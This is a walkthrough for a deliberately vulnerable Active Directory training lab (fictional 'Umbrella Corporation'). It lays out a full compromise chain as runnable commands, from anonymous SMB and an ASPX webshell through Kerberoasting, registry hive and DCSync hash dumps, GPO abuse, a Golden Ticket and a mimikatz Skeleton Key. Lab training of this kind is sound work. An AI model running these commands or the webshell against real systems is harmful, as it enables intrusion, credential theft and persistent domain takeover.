# 0xLab-AD — Attack Chain Walkthrough

> **Umbrella Corporation** — Full domain compromise from anonymous access to Domain Admin.
>
> This walkthrough assumes you are on the **KALI** VM (`192.168.56.100`).
> All tools are pre-installed via Vagrant provisioning.

---

## Table of Contents

1. [Reconnaissance & Enumeration](#1-reconnaissance--enumeration)
2. [Entry Point — Anonymous SMB + IIS Webshell](#2-entry-point--anonymous-smb--iis-webshell)
3. [Lateral Movement — Credential Abuse](#3-lateral-movement--credential-abuse)
4. [Privilege Escalation — Domain Compromise](#4-privilege-escalation--domain-compromise)
5. [Persistence](#5-persistence)

---

## 1. Reconnaissance & Enumeration

### 1.1 Automated Enumeration

```bash
# Run the automated enumeration script
/opt/0xlab/auto-enum.sh

# Results are saved to /results/<timestamp>/
```

### 1.2 Manual Network Discovery

```bash
# Quick scan of the lab subnet
nmap -sV -sC -T4 192.168.56.0/24

# Full port scan on DC01
nmap -sV -sC -p- -T4 192.168.56.10

# Full port scan on SRV01
nmap -sV -sC -p- -T4 192.168.56.11
```

### 1.3 SMB Enumeration

```bash
# List shares on SRV01 (anonymous)
smbclient -N -L //192.168.56.11

# Expected: Public share is accessible without authentication
# Connect and download contents
smbclient -N //192.168.56.11/Public
smb: \> dir
smb: \> get IT-Memo-Monitoring-Setup.txt
smb: \> get Server-Inventory-Q1.txt
```

### 1.4 LDAP Enumeration

```bash
# Anonymous LDAP enumeration
ldapsearch -x -H ldap://192.168.56.10 -b "DC=umbrella,DC=corp" \
    "(objectClass=user)" sAMAccountName userPrincipalName

# Find Kerberoastable accounts (users with SPNs)
ldapsearch -x -H ldap://192.168.56.10 -b "DC=umbrella,DC=corp" \
    "(&(objectClass=user)(servicePrincipalName=*))" \
    sAMAccountName servicePrincipalName
```

---

## 2. Entry Point — Anonymous SMB + IIS Webshell

### 2.1 Credential Discovery (SMB)

The anonymous Public share on SRV01 contains an IT memo with cleartext credentials:

```
Username: UMBRELLA\svc_monitor
Password: Monitor2024!
```

**Validate the credentials:**

```bash
# Test with CrackMapExec
crackmapexec smb 192.168.56.10 -u 'svc_monitor' -p 'Monitor2024!' -d 'umbrella.corp'

# Expected output: [+] umbrella.corp\svc_monitor:Monitor2024!
```

### 2.2 IIS Webshell Upload (SRV01)

SRV01 runs an intranet application on port 8080 with a vulnerable file upload
endpoint that accepts `.aspx` files without validation.

```bash
# Create a simple ASPX webshell
cat > /tmp/cmd.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    if (Request["cmd"] != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
EOF

# Upload webshell via curl
curl -F "fileUpload=@/tmp/cmd.aspx" http://192.168.56.11:8080/intranet/upload.aspx

# Execute commands through the webshell
curl "http://192.168.56.11:8080/intranet/uploads/cmd.aspx?cmd=whoami"
curl "http://192.168.56.11:8080/intranet/uploads/cmd.aspx?cmd=ipconfig"
```

---

## 3. Lateral Movement — Credential Abuse

### 3.1 ACL Abuse: svc_monitor → svc_backup (GenericWrite)

`svc_monitor` has **GenericWrite** over `svc_backup`, allowing password reset
or targeted Kerberoasting.

```bash
# Verify with BloodHound
bloodhound-python -d umbrella.corp -u 'svc_monitor' -p 'Monitor2024!' \
    -ns 192.168.56.10 -c All --zip

# Import the ZIP into BloodHound GUI and check:
# svc_monitor --[GenericWrite]--> svc_backup

# Option A: Reset svc_backup password using rpcclient
rpcclient -U 'umbrella.corp/svc_monitor%Monitor2024!' 192.168.56.10 \
    -c "setuserinfo2 svc_backup 23 'Pwned2024!'"

# Option B: Set SPN on svc_backup for targeted Kerberoasting
python3 -m impacket.addspn -u 'umbrella.corp/svc_monitor' \
    -p 'Monitor2024!' -t 'svc_backup' -s 'HTTP/fake' \
    'umbrella.corp/svc_backup'
```

### 3.2 Kerberoasting: svc_sql

`svc_sql` has an SPN set and uses a weak password (`SQLSummer2024`).

```bash
# Request TGS tickets for all Kerberoastable accounts
impacket-GetUserSPNs -request -dc-ip 192.168.56.10 \
    'umbrella.corp/svc_monitor:Monitor2024!' \
    -outputfile /results/kerberoast.txt

# Crack with hashcat (mode 13100 for Kerberos 5 TGS-REP)
hashcat -m 13100 /results/kerberoast.txt /usr/share/wordlists/rockyou.txt

# Or with John
john --wordlist=/usr/share/wordlists/rockyou.txt /results/kerberoast.txt

# Expected result: svc_sql:SQLSummer2024
```

### 3.3 Backup Operators Abuse: Registry Hive Dump

As `svc_backup` (member of **Backup Operators**), dump registry hives
containing local credentials.

```bash
# Connect with svc_backup credentials (after password reset or cracking)
impacket-reg 'umbrella.corp/svc_backup:Pwned2024!@192.168.56.10' \
    save -keyName 'HKLM\SAM' -o '\\192.168.56.100\share\SAM'

impacket-reg 'umbrella.corp/svc_backup:Pwned2024!@192.168.56.10' \
    save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.100\share\SYSTEM'

impacket-reg 'umbrella.corp/svc_backup:Pwned2024!@192.168.56.10' \
    save -keyName 'HKLM\SECURITY' -o '\\192.168.56.100\share\SECURITY'

# Extract hashes from the hives
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

---

## 4. Privilege Escalation — Domain Compromise

### 4.1 AS-REP Roasting: Dr. Bob White

`b.white` has **"Do not require Kerberos preauthentication"** enabled.

```bash
# Get AS-REP hash without credentials
impacket-GetNPUsers -dc-ip 192.168.56.10 \
    'umbrella.corp/' -usersfile /tmp/users.txt \
    -format hashcat -outputfile /results/asrep.txt

# Or directly target b.white
impacket-GetNPUsers -dc-ip 192.168.56.10 \
    'umbrella.corp/b.white' -no-pass \
    -format hashcat -outputfile /results/asrep.txt

# Crack with hashcat (mode 18200 for AS-REP)
hashcat -m 18200 /results/asrep.txt /usr/share/wordlists/rockyou.txt

# Expected result: b.white:Biologist2024!
```

### 4.2 DCSync Attack: svc_deploy

`svc_deploy` has **Replicating Directory Changes All** permission on the
domain object — this allows a DCSync attack to dump all password hashes.

```bash
# DCSync to dump all domain hashes
impacket-secretsdump -dc-ip 192.168.56.10 \
    'umbrella.corp/svc_deploy:DeployAut0m@tion!@192.168.56.10'

# Or target specific accounts
impacket-secretsdump -dc-ip 192.168.56.10 \
    'umbrella.corp/svc_deploy:DeployAut0m@tion!@192.168.56.10' \
    -just-dc-user Administrator

impacket-secretsdump -dc-ip 192.168.56.10 \
    'umbrella.corp/svc_deploy:DeployAut0m@tion!@192.168.56.10' \
    -just-dc-user krbtgt
```

### 4.3 GPO Abuse: IT_Admins

`IT_Admins` (which includes `helpdesk01`) has **GenericAll** on the
Default Domain Policy. This can be abused to push malicious settings.

```bash
# Use SharpGPOAbuse (from Windows) or pyGPOAbuse
# Example: Add helpdesk01 as local admin on all machines
python3 pygpoabuse.py 'umbrella.corp/helpdesk01:H3lpd3sk2024!' \
    -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" \
    -command 'net localgroup administrators umbrella\helpdesk01 /add' \
    -f
```

---

## 5. Persistence

### 5.1 Golden Ticket

After obtaining the `krbtgt` NTLM hash via DCSync:

```bash
# Create Golden Ticket with impacket
impacket-ticketer -nthash <KRBTGT_HASH> \
    -domain-sid <DOMAIN_SID> \
    -domain umbrella.corp \
    Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass 'umbrella.corp/Administrator@dc01.umbrella.corp'
```

### 5.2 Skeleton Key

With admin access to the DC, inject Skeleton Key via mimikatz:

```powershell
# On DC01 (from webshell or psexec session)
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Now ANY account can authenticate with the skeleton password: "mimikatz"
# The original passwords also continue to work
```

### 5.3 AdminSDHolder Abuse

`IT_Admins` has **GenericAll** on the `AdminSDHolder` container.
Every 60 minutes, `SDProp` propagates this ACL to all protected groups
(Domain Admins, Enterprise Admins, etc.).

```bash
# After SDProp runs, IT_Admins will have full control over Domain Admins
# Verify with:
python3 -m impacket.dacledit -dc-ip 192.168.56.10 \
    'umbrella.corp/helpdesk01:H3lpd3sk2024!' \
    -target-dn "CN=Domain Admins,CN=Users,DC=umbrella,DC=corp" \
    -action read
```

---

## Attack Path Summary

```
Anonymous SMB (SRV01)
    │
    ▼
Discover svc_monitor creds (cleartext in memo)
    │
    ├──► IIS Webshell Upload (port 8080)
    │        └──► RCE on SRV01
    │
    ▼
ACL Abuse: svc_monitor → GenericWrite → svc_backup
    │
    ├──► Kerberoast svc_sql → crack weak password
    │
    ▼
svc_backup (Backup Operators) → dump SAM/SYSTEM/SECURITY
    │
    ▼
AS-REP Roast b.white → crack password
    │
    ▼
DCSync via svc_deploy → dump all hashes (incl. krbtgt)
    │
    ├──► Golden Ticket
    ├──► GPO Abuse via IT_Admins
    └──► AdminSDHolder persistence
    │
    ▼
FULL DOMAIN COMPROMISE
```

---

## Tools Reference

| Tool | Purpose | Install |
|------|---------|---------|
| `nmap` | Network scanning | `apt install nmap` |
| `enum4linux-ng` | SMB/NetBIOS enumeration | `apt install enum4linux` |
| `smbclient` | SMB file access | `apt install smbclient` |
| `ldapsearch` | LDAP queries | `apt install ldap-utils` |
| `bloodhound-python` | AD graph collection | `pip3 install bloodhound` |
| `crackmapexec` | Multi-protocol attacks | `apt install crackmapexec` |
| `impacket` | Windows protocol tools | `pip3 install impacket` |
| `hashcat` | Password cracking (GPU) | `apt install hashcat` |
| `john` | Password cracking (CPU) | `apt install john` |
| `evil-winrm` | WinRM shell | `apt install evil-winrm` |
| `responder` | LLMNR/NBT-NS poisoning | `apt install responder` |
